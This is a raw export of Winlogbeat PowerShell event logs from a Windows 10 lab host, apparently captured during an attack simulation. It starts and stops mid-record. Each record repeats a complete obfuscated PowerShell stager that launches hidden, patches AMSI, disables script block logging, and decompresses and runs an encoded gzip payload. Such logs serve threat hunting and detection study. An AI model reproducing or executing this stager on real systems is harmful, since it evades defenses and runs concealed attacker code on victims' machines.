zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx''+''3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef''+''p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS''+''WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M''+''pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}'')-f''='',''s'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=5.1.19041.1682
	RunspaceId=3a22a598-5095-4cd2-bacb-d5cf16b6174f
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Available,"-","-","-","-",None,"-","-","-","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=72dbcb14-d4f9-4aad-8427-43c1937a4cd2
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=((''{5}na{3}''+''leSc{4}i{1}tBlo''+''c''+''kIn''+''{0}''+''ocation{2}og''+''ging''+'''')-f''v'',''p'',''L'',''b'',''r'',''E''); $eut=[Ref].Assembly.GetType(((''{''+''6''+''}''+''{2}''+''st{''+''9''+''}m.''+''{5}''+''ana''+''{1}{''+''9}m{9}nt.{''+''8}{0}''+''t{7}m''+''a''+''t''+''i''+''{7''+''}n.''+''{8}m''+''s''+''i{4}ti{3}s'')-f''u'',''g'',''y'',''l'',''U'',''M'',''S'',''o'',''A'',''e'')); $oFs1=((''En{2}b''+''l{1}Sc{3}i''+''ptBl''+''o''+''c{0}Logging''+'''')-f''k'',''e'',''a'',''r''); if ($eut) { $eut.GetField(((''a{2}si{1''+''}''+''{''+''0}''+''i{''+''4}Faile{''+''3''+''}''+'''')-f''n'',''I'',''m'',''d'',''t''),''NonPublic,Static'').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType(((''{''+''5}{2}ste''+''m.{1}anagement.''+''{''+''3}{0}t''+''omat''+''ion.{''+''4}tils'')-f''u'',''M'',''y'',''A'',''U'',''S'')); $hagi=((''Scri''+''pt''+''{''+''0}lock{1}og''+''gi{2}g'')-f''B'',''L'',''n''); $fQpa=$q6h.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''''+''Sy{0}''+''tem.Manag''+''ement.{2}{5}tomati''+''on''+''.Scri{''+''1}t''+''B{4}oc{3''+''}'')-f''s'',''p'',''A'',''k'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb''+''gx0SJalyJ9VS''+''wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk''+''kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q''+''p''+''Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W''+''K2QdwmYcTHIgU5J''+''cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA''+''4M''+''peEYdiluJRltrUJfrOpn5+ePFFNAz''+''MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p''+''HjvvNJQ17rAn''+''7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S''+''r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG''+''N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0''+''fnY1Hl3q{1}fIU{1}bY''+''X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx''+''3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef''+''p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS''+''WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M''+''pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}'')-f''='',''s'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=5.1.19041.1682
	RunspaceId=3a22a598-5095-4cd2-bacb-d5cf16b6174f
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",400,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6169,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:52:45.061",73kLBIQByII7dpeEXg2S,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:52:45.518","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=72dbcb14-d4f9-4aad-8427-43c1937a4cd2
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=((''{5}na{3}''+''leSc{4}i{1}tBlo''+''c''+''kIn''+''{0}''+''ocation{2}og''+''ging''+'''')-f''v'',''p'',''L'',''b'',''r'',''E''); $eut=[Ref].Assembly.GetType(((''{''+''6''+''}''+''{2}''+''st{''+''9''+''}m.''+''{5}''+''ana''+''{1}{''+''9}m{9}nt.{''+''8}{0}''+''t{7}m''+''a''+''t''+''i''+''{7''+''}n.''+''{8}m''+''s''+''i{4}ti{3}s'')-f''u'',''g'',''y'',''l'',''U'',''M'',''S'',''o'',''A'',''e'')); $oFs1=((''En{2}b''+''l{1}Sc{3}i''+''ptBl''+''o''+''c{0}Logging''+'''')-f''k'',''e'',''a'',''r''); if ($eut) { $eut.GetField(((''a{2}si{1''+''}''+''{''+''0}''+''i{''+''4}Faile{''+''3''+''}''+'''')-f''n'',''I'',''m'',''d'',''t''),''NonPublic,Static'').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType(((''{''+''5}{2}ste''+''m.{1}anagement.''+''{''+''3}{0}t''+''omat''+''ion.{''+''4}tils'')-f''u'',''M'',''y'',''A'',''U'',''S'')); $hagi=((''Scri''+''pt''+''{''+''0}lock{1}og''+''gi{2}g'')-f''B'',''L'',''n''); $fQpa=$q6h.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''''+''Sy{0}''+''tem.Manag''+''ement.{2}{5}tomati''+''on''+''.Scri{''+''1}t''+''B{4}oc{3''+''}'')-f''s'',''p'',''A'',''k'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb''+''gx0SJalyJ9VS''+''wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk''+''kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q''+''p''+''Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W''+''K2QdwmYcTHIgU5J''+''cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA''+''4M''+''peEYdiluJRltrUJfrOpn5+ePFFNAz''+''MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p''+''HjvvNJQ17rAn''+''7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S''+''r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG''+''N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0''+''fnY1Hl3q{1}fIU{1}bY''+''X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx''+''3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef''+''p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS''+''WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M''+''pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}'')-f''='',''s'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Registry,"-","-","-","-",Started,"-","-","-","	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=72dbcb14-d4f9-4aad-8427-43c1937a4cd2
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=((''{5}na{3}''+''leSc{4}i{1}tBlo''+''c''+''kIn''+''{0}''+''ocation{2}og''+''ging''+'''')-f''v'',''p'',''L'',''b'',''r'',''E''); $eut=[Ref].Assembly.GetType(((''{''+''6''+''}''+''{2}''+''st{''+''9''+''}m.''+''{5}''+''ana''+''{1}{''+''9}m{9}nt.{''+''8}{0}''+''t{7}m''+''a''+''t''+''i''+''{7''+''}n.''+''{8}m''+''s''+''i{4}ti{3}s'')-f''u'',''g'',''y'',''l'',''U'',''M'',''S'',''o'',''A'',''e'')); $oFs1=((''En{2}b''+''l{1}Sc{3}i''+''ptBl''+''o''+''c{0}Logging''+'''')-f''k'',''e'',''a'',''r''); if ($eut) { $eut.GetField(((''a{2}si{1''+''}''+''{''+''0}''+''i{''+''4}Faile{''+''3''+''}''+'''')-f''n'',''I'',''m'',''d'',''t''),''NonPublic,Static'').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType(((''{''+''5}{2}ste''+''m.{1}anagement.''+''{''+''3}{0}t''+''omat''+''ion.{''+''4}tils'')-f''u'',''M'',''y'',''A'',''U'',''S'')); $hagi=((''Scri''+''pt''+''{''+''0}lock{1}og''+''gi{2}g'')-f''B'',''L'',''n''); $fQpa=$q6h.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''''+''Sy{0}''+''tem.Manag''+''ement.{2}{5}tomati''+''on''+''.Scri{''+''1}t''+''B{4}oc{3''+''}'')-f''s'',''p'',''A'',''k'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb''+''gx0SJalyJ9VS''+''wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk''+''kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q''+''p''+''Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W''+''K2QdwmYcTHIgU5J''+''cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA''+''4M''+''peEYdiluJRltrUJfrOpn5+ePFFNAz''+''MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p''+''HjvvNJQ17rAn''+''7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S''+''r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG''+''N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0''+''fnY1Hl3q{1}fIU{1}bY''+''X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx''+''3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef''+''p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS''+''WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M''+''pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}'')-f''='',''s'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6163,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:52:45.061",8HkLBIQByII7dpeEXg2S,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:52:45.518","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=72dbcb14-d4f9-4aad-8427-43c1937a4cd2
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=((''{5}na{3}''+''leSc{4}i{1}tBlo''+''c''+''kIn''+''{0}''+''ocation{2}og''+''ging''+'''')-f''v'',''p'',''L'',''b'',''r'',''E''); $eut=[Ref].Assembly.GetType(((''{''+''6''+''}''+''{2}''+''st{''+''9''+''}m.''+''{5}''+''ana''+''{1}{''+''9}m{9}nt.{''+''8}{0}''+''t{7}m''+''a''+''t''+''i''+''{7''+''}n.''+''{8}m''+''s''+''i{4}ti{3}s'')-f''u'',''g'',''y'',''l'',''U'',''M'',''S'',''o'',''A'',''e'')); $oFs1=((''En{2}b''+''l{1}Sc{3}i''+''ptBl''+''o''+''c{0}Logging''+'''')-f''k'',''e'',''a'',''r''); if ($eut) { $eut.GetField(((''a{2}si{1''+''}''+''{''+''0}''+''i{''+''4}Faile{''+''3''+''}''+'''')-f''n'',''I'',''m'',''d'',''t''),''NonPublic,Static'').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType(((''{''+''5}{2}ste''+''m.{1}anagement.''+''{''+''3}{0}t''+''omat''+''ion.{''+''4}tils'')-f''u'',''M'',''y'',''A'',''U'',''S'')); $hagi=((''Scri''+''pt''+''{''+''0}lock{1}og''+''gi{2}g'')-f''B'',''L'',''n''); $fQpa=$q6h.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''''+''Sy{0}''+''tem.Manag''+''ement.{2}{5}tomati''+''on''+''.Scri{''+''1}t''+''B{4}oc{3''+''}'')-f''s'',''p'',''A'',''k'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb''+''gx0SJalyJ9VS''+''wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk''+''kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q''+''p''+''Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W''+''K2QdwmYcTHIgU5J''+''cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA''+''4M''+''peEYdiluJRltrUJfrOpn5+ePFFNAz''+''MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p''+''HjvvNJQ17rAn''+''7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S''+''r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG''+''N5MauZ{1}wtqKZgbehCf252lTUZSGi